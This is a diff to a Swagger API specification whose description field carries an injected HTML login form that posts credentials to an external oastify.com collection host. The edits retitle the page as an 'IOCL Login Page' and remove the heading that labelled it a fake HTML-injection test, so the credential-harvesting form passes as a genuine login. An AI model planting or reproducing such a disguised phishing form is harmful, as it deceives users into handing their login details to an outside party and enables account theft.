@@ -1,10 +1,9 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
+  title: IOCL Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
         <form action="http://xvwi1tniyij8br96h8mrwzf5swynmda2.oastify.com/login" method="post" class="form-signin">
